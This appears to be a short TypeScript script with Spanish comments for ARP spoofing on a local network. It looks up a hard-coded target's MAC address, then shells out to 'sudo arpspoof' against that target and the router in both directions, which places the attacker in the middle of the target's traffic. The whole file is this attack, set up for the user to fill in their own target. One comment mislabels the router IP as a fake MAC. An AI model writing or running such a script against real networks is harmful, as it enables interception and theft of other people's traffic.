import * as arp from 'node-arp';
import * as os from 'os';
import { exec, spawn } from 'child_process';

const interfaz = 'wlp2s0'; // interfaz de red
const targetIp = '192.168.0.103'; // Cambia esto a la IP de tu objetivo
const routerIp = '192.168.0.1'; // Cambia esto por una MAC falsa

// Función para obtener la MAC de un dispositivo en la red por ip
function getNetworkInfo() {
  arp.getMAC(targetIp, (err, mac) => {
    if (err) {
      console.error('Error al obtener MAC:', err);
    } else {
      console.log(`Dirección MAC de ${targetIp}: ${mac}`);
    }
  });
}

// Función de ARP Spoofing
function arpSpoof() {
  // Comando para enviar ARP packets falsos (requiere privilegios de administrador)
  const command = `sudo arpspoof -i ${interfaz} -c both -t ${targetIp} -r ${routerIp}`;
  
  exec(command, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error al ejecutar el comando: ${error.message}`);
      return;
    }
    if (stderr) {
      console.error(`stderr: ${stderr}`);
      return;
    }
    console.log(`stdout: ${stdout}`);
  });
}

// Obtenemos la dirección MAC del objetivo
getNetworkInfo();

// Ejecutamos ARP Spoofing
arpSpoof();